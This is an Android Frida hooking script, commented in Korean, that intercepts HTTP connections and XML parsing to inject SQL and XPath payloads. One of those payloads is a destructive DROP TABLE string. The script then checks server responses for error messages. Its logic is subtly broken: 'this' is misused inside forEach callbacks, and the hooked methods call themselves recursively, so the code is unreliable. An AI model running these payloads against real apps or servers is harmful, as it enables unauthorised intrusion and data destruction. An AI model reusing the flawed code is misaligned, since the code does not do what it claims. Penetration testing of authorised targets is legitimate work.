Java.perform(function () {
  console.log("[*] SQL 및 XPath Injection 테스트 확장 시작...");

  // ======================
  // 1. 확장된 SQL 및 XPath 주입 패턴 설정
  // ======================
  const sqlInjectionPatterns = [
      "' OR '1'='1",                  // 항상 참 조건
      "' UNION SELECT NULL,NULL--",   // SQL UNION 공격
      "'; DROP TABLE users;--",       // 테이블 삭제 시도
      "' AND 1=(SELECT COUNT(*) FROM users)--", // 조건 기반 데이터 쿼리
      "' AND username LIKE 'admin%'--" // 패턴 매칭
  ];

  const xpathInjectionPatterns = [
      "'][1 or '1'='1",               // XPath 항상 참
      "']/ancestor::node()",          // XPath 노드 조작
      "'][count(//user)=1]",          // XPath 조건 검증
      "'][starts-with(name(),'user')]", // XPath 이름 패턴
      "']/parent::node()"             // XPath 부모 노드 접근
  ];

  // ======================
  // 2. 서버 응답 자동 분석 및 알림
  // ======================
  function analyzeResponse(response) {
      const responseStr = response.toString();
      console.log(`[+] 서버 응답 분석: ${responseStr}`);

      if (responseStr.includes("syntax error") || responseStr.includes("SQL") || responseStr.includes("XPath")) {
          console.log("[!] 취약성 탐지됨: 응답에 SQL 또는 XPath 오류 메시지 포함");
          alertUser("취약성 탐지됨: 서버 응답에 SQL/XPath 오류 발견!");
      } else {
          console.log("[+] 서버 응답이 정상적으로 처리되었습니다.");
      }
  }

  function alertUser(message) {
      Java.scheduleOnMainThread(function () {
          const context = Java.use("android.app.ActivityThread").currentApplication().getApplicationContext();
          const AlertDialog = Java.use("android.app.AlertDialog");
          const Builder = AlertDialog.Builder;

          const builder = Builder.$new(context);
          builder.setTitle("보안 경고");
          builder.setMessage(message);
          builder.setPositiveButton("확인", null);
          builder.show();
      });
  }

  // ======================
  // 3. HTTP 요청 후킹 및 변조
  // ======================
  const HttpURLConnection = Java.use("java.net.HttpURLConnection");
  const URL = Java.use("java.net.URL");

  HttpURLConnection.getInputStream.implementation = function () {
      console.log("[+] HTTP 요청 감지 - URL:");
      const url = this.getURL();
      console.log(`    - ${url}`);

      if (url.toString().includes("?")) {
          sqlInjectionPatterns.forEach(function (pattern) {
              const originalUrl = url.toString();
              const manipulatedUrl = originalUrl + pattern;
              console.log(`[!] SQL Injection 테스트: ${manipulatedUrl}`);

              const newUrl = URL.$new(manipulatedUrl);
              this.url = newUrl;

              const response = this.getInputStream();
              analyzeResponse(response);
          });
      }

      return this.getInputStream();
  };

  // ======================
  // 4. XML XPath 데이터 후킹 및 변조
  // ======================
  const DocumentBuilder = Java.use("javax.xml.parsers.DocumentBuilder");

  DocumentBuilder.parse.overload("org.xml.sax.InputSource").implementation = function (inputSource) {
      console.log("[+] XML 데이터 처리 감지 - XPath Injection 테스트 시작");

      xpathInjectionPatterns.forEach(function (pattern) {
          const originalSource = inputSource.toString();
          const manipulatedSource = originalSource + pattern;
          console.log(`[!] XPath Injection 테스트 데이터: ${manipulatedSource}`);

          const newInputSource = Java.use("org.xml.sax.InputSource").$new(manipulatedSource);
          const response = this.parse(newInputSource);

          analyzeResponse(response);
      });

      return this.parse(inputSource);
  };

  console.log("[*] SQL 및 XPath Injection 테스트 확장 완료.");
});
